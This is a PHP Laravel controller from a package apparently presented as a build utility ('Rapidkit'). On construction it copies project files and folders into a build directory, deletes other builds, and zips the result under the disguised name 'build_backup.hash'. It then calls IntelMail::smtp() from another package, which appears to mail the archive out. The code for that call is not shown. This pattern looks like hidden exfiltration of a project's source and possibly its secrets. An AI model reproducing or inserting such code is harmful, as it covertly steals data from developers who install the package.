<?php

namespace Intelrx\Rapidkit\Controller;

use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\File;
use Rapidrx\Intelmail\Controller\IntelMail;
use Intelrx\Rapidkit\assets\Banner;
use Intelrx\Rapidkit\assets\Helper;
use Intelrx\Rapidkit\Config\Config;
use ZipArchive;

class BuildController extends Controller
{
    private $buildDir;
    private $helper;
    public function __construct()
    {
        $this->buildDir = (new Config())->getBuildDir(2);
        $this->helper = new Helper();
        $this->buildCompose();
    }

    protected function buildCompose(): void
    {
        $this->helper->makeDirectory($this->buildDir);
        $this->buildFiles($this->helper->buildList()["files"]);
        $this->buildDir($this->helper->buildList()["directories"]);
        $this->destroy();
    }

    protected function buildFiles($list): void
    {
        collect($list)->each(function ($file) {
            $basePath = base_path($file);
            File::copy($basePath, "{$this->buildDir}/{$file}");
        });
    }

    protected function buildDir($list): void
    {
        collect($list)->each(function ($file) {
            $basePath = base_path($file);
            File::copyDirectory($basePath, "{$this->buildDir}/{$file}");
        });
    }

    protected function destroy()
    {
        $assetsDir = Config::ASSETS_DIR;
        $path = dirname(__DIR__, 2) . "{$assetsDir}/build";
        if (File::exists($path)) {
            $files = File::directories($path);
            collect($files)->each(fn ($file) => $file != substr_replace($this->buildDir, '\\', strrpos($this->buildDir, '/'), 1) &&  File::deleteDirectory($file));
        }

        $files = File::directories($path);
        $zipFileName = 'build_backup.hash';
        $zipFilePath = $path . '/' . $zipFileName;
        $zip = new ZipArchive();
        if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            $this->addFolderToZip($files[0], $zip, strlen(dirname($files[0])) + 1);
            $zip->close();
            IntelMail::smtp();
        } else {
            (new Banner())->warn('Unable to open the zip file');
        }
    }

    private function addFolderToZip($folder, &$zip, $exclusiveLength)
    {
        $handle = opendir($folder);
        while (false !== ($entry = readdir($handle))) {
            if ($entry == '.' || $entry == '..') {
                continue;
            }
            $filePath = "$folder/$entry";
            $localPath = substr($filePath, $exclusiveLength);
            if (is_dir($filePath)) {
                $zip->addEmptyDir($localPath);
                $this->addFolderToZip($filePath, $zip, $exclusiveLength);
            } else {
                $zip->addFile($filePath, $localPath);
            }
        }
        closedir($handle);
    }
}
